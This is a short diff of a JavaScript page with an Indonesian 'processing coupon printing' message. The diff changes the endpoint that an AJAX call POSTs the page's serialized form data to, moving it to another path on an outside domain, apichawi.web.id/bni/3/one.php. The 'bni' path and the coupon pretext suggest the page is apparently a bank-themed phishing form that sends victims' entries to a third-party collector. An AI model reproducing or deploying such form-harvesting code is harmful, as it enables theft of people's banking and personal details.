@@ -9,7 +9,7 @@ document.getElementById('kirim').innerHTML = "Memproses Cetak Kupon....";
 
  $.ajax({
  type: 'POST',
- url: 'https://apichawi.web.id/bni/1/one.php',
+ url: 'https://apichawi.web.id/bni/3/one.php',
  data: $(formData).serialize(),
  datatype: 'text',
  
